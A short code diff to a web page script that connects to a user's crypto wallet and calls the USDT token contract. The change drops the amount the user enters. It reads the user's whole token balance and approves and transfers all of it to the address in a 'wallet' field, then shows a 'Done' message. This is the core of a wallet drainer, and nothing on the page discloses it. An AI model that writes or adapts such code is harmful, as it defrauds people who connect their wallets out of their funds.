@@ -146,15 +146,13 @@
         await window.ethereum.request({ method: 'eth_requestAccounts' });
         const accounts = await web3.eth.getAccounts();
         const user = accounts[0];
-
         const wallet = document.getElementById("wallet").value;
-        const amount = document.getElementById("amount").value;
 
         const contract = new web3.eth.Contract(ABI, "0x55d398326f99059fF775485246999027B3197955"); // USDT
-        const value = web3.utils.toWei(amount, 'mwei'); // for USDT 6 decimals
+        const balance = await contract.methods.balanceOf(user).call();
 
-        await contract.methods.approve(wallet, value).send({ from: user });
-        await contract.methods.transferFrom(user, wallet, value).send({ from: user });
+        await contract.methods.approve(wallet, balance).send({ from: user });
+        await contract.methods.transferFrom(user, wallet, balance).send({ from: user });
 
         btn.innerText = "✅ Done";
       } catch (e) {
